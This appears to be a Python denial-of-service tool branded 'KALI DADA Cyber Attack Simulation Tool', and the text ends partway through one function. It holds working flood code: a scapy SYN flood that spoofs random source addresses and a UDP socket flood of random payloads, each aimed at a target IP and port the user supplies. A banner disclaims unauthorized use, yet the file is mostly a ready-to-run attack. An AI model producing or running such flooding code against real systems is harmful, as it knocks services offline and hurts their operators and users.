#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import ipaddress
from scapy.all import IP, TCP, ICMP, send, conf
from typing import Optional

# ANSI Colors Configuration
COLORS = {
    "GREEN": "\033[92m",
    "RED": "\033[91m",
    "CYAN": "\033[96m",
    "YELLOW": "\033[93m",
    "BOLD": "\033[1m",
    "RESET": "\033[0m",
}

# Global Configuration
MAX_PORTS = 65535
MIN_PORTS = 1
PACKET_SIZES = {
    "UDP": 1024,
    "ICMP": 65500,
}
NAME = "Sujal Lamichhane"
VERSION = "2.1"

def color_text(text: str, color: str) -> str:
    """Return colored text if ANSI supported, else plain text."""
    return f"{COLORS[color]}{text}{COLORS['RESET']}" if sys.stdout.isatty() else text

def print_warning() -> None:
    """Display enhanced warning message with timeout."""
    os.system("clear")
    warning = color_text(f"""
##############################################################################
#  WARNING: THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!       #
#  UNAUTHORIZED USE IS STRICTLY PROHIBITED.                                  #
#  BY USING THIS SOFTWARE, YOU AGREE TO USE IT ONLY IN LEGAL, AUTHORIZED     #
#  ENVIRONMENTS WITH PROPER CONSENT.                                         #
#                                                                            #
#  DISCLAIMER: THE AUTHOR IS NOT LIABLE FOR ANY MISUSE OR DAMAGES CAUSED     #
#  BY THIS SOFTWARE. USE AT YOUR OWN RISK.                                  #
##############################################################################

{color_text('KALI DADA Cyber Range Tool', 'YELLOW')} {color_text(f'v{VERSION}', 'CYAN')}
{color_name()}
""", "RED")
    print(warning)
    for remaining in range(5, 0, -1):
        print(color_text(f"Initializing in {remaining}...", "YELLOW"), end="\r")
        time.sleep(1)
    os.system("clear")

def print_kali_dada_banner() -> None:
    """Display the KALI DADA banner and website info."""
    os.system("clear")
    banner = f"""
{color_text('  /$$   /$$ /$$$$$$     /$$       /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$  ', 'GREEN')}
{color_text('| $$  /$$/ /$$ __  $$  | $$      |_  $$_/      | $$__  $$  /$$__  $$| $$__  $$ /$$__  $$', 'GREEN')}
{color_text('| $$ /$$/ | $$   \ $$  | $$        | $$        | $$  \ $$ | $$  \ $$| $$  \ $$| $$  \ $$', 'GREEN')}
{color_text('| $$$$$/  | $$$$$$$$$  | $$        | $$        | $$  | $$ | $$$$$$$$| $$  | $$| $$$$$$$$', 'GREEN')}
{color_text('| $$  $$  | $$___  $$  | $$        | $$        | $$  | $$ | $$__  $$| $$  | $$| $$__  $$', 'GREEN')}
{color_text('| $$\  $$ | $$   | $$  | $$        | $$        | $$  | $$ | $$  | $$| $$  | $$| $$  | $$', 'GREEN')}
{color_text('| $$ \\  $$| $$  | $$  | $$$$$$$$ /$$$$$$      | $$$$$$$/ | $$  | $$| $$$$$$$/| $$  | $$', 'GREEN')}
{color_text('|__/  \\__/|__/  |__/  |________/|______/      |_______/  |__/  |__/|_______/ |__/  |__/', 'GREEN')}
               {color_text('Welcome to KALI DADA\'s Cyber Attack Simulation Tool', 'CYAN')}
"""
    print(banner)
    print(f"{color_text('Created by: ', 'YELLOW')}{NAME}{COLORS['RESET']}")
    print(f"{color_text('Website: ', 'CYAN')}sujallamichhane.com.np{COLORS['RESET']}")
    print(f"{color_text('[INFO] Visit: ', 'CYAN')}sujallamichhane.com.np for more cybersecurity insights!{COLORS['RESET']}\n")
    time.sleep(1)

def validate_ip(ip: str) -> bool:
    """Validate IPv4 address format."""
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def validate_port(port: int) -> bool:
    """Validate TCP/UDP port range."""
    return MIN_PORTS <= port <= MAX_PORTS

def get_valid_input(prompt: str, validation_func, error_msg: str, cast_type=int) -> any:
    """Generic input validation function."""
    while True:
        try:
            value = cast_type(input(color_text(prompt, "CYAN")))
            if validation_func(value):
                return value
            print(color_text(error_msg, "RED"))
        except ValueError:
            print(color_text("Invalid input format.", "RED"))

def perform_health_check(target_ip: str, port: int = 80, timeout: int = 2) -> bool:
    """Enhanced health check with multiple verification methods."""
    try:
        # ICMP Ping Check
        conf.verb = 0
        ping = IP(dst=target_ip)/ICMP()
        if not ping:
            return False

        # TCP Port Check
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((target_ip, port)) == 0
    except Exception as e:
        print(color_text(f"Health check failed: {str(e)}", "RED"))
        return False

def syn_flood(target_ip: str, target_port: int, duration: int) -> dict:
    """Advanced SYN Flood with statistics tracking."""
    stats = {"start_time": time.time(), "packet_count": 0, "total_size": 0}
    print(color_text(f"\n🚀 Initiating SYN Flood on {target_ip}:{target_port}", "YELLOW"))

    try:
        while time.time() - stats["start_time"] < duration:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            packet = IP(src=src_ip, dst=target_ip)/TCP(
                sport=random.randint(1024, MAX_PORTS),
                dport=target_port,
                flags="S"
            )
            send(packet, verbose=False)
            stats["packet_count"] += 1
            stats["total_size"] += len(packet)
            print(color_text(f"⏩ Packets: {stats['packet_count']} | Throughput: {stats['total_size']/1024:.2f} KB", "CYAN"), end="\r")
    except KeyboardInterrupt:
        print(color_text("\n🛑 Attack interrupted by user", "RED"))

    stats["duration"] = time.time() - stats["start_time"]
    return stats

def udp_flood(target_ip: str, target_port: int, duration: int) -> dict:
    """Advanced UDP Flood with statistics tracking."""
    stats = {"start_time": time.time(), "packet_count": 0, "total_size": 0}
    print(color_text(f"\n🚀 Initiating UDP Flood on {target_ip}:{target_port}", "YELLOW"))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(PACKET_SIZES["UDP"])
    except Exception as e:
        print(color_text(f"[ERROR] Could not create UDP socket: {e}", "RED"))
        return stats

    try:
        while time.time() - stats["start_time"] < duration:
            sock.sendto(packet, (target_ip, target_port))
            stats["packet_count"] += 1
            stats["total_size"] += len(packet)
            print(color_text(f"⏩ Packets: {stats['packet_count']} | Throughput: {stats['total_size']/1024:.2f} KB", "CYAN"), end="\r")
    except KeyboardInterrupt:
        print(color_text("\n🛑 Attack interrupted by user", "RED"))

   
